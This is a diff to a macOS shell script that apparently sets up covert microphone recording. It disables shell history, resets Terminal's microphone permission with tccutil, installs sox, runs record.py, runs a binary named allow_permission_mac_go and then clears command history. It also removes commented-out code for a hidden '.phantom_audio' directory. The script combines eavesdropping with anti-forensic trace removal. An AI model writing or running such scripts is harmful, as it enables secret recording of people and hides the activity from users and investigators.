@@ -1,23 +1,9 @@
-# Add environment variable settings to .bashrc and reload it
-if ! grep -q "HISTCONTROL=ignorespace" ~/.bashrc; then
-    echo 'export HISTCONTROL=ignorespace' >>~/.bashrc
-fi
-if ! grep -q "unset HISTFILE" ~/.bashrc; then
-    echo 'unset HISTFILE' >>~/.bashrc
-fi
-source ~/.bashrc
+# Ensures that no history is saved to disk
+export HISTCONTROL=ignorespace
+unset HISTFILE
 
 # Reset microphone permission for Terminal
 tccutil reset Microphone com.apple.Terminal
-
-# Create the .phantom_audio directory and navigate into it
-# if [ ! -d ~/.phantom_audio ]; then
-#     mkdir -p ~/.phantom_audio
-# fi
-# cd ~/.phantom_audio || {
-#     echo "Failed to navigate to .phantom_audio directory"
-#     exit 1
-# }
 
 # Installing "brew" and "sox" voice recording dependency
 if ! command -v brew &>/dev/null; then
@@ -47,5 +33,5 @@ python3 record.py >>record_output.txt 2>&1
 sleep 0.5
 ./allow_permission_mac_go
 
-# Clear last 12 history command
-history | head -n -12 >~/.bash_history && history -c && history -r
+# Clear the history of any commands run so far in this session
+history -c
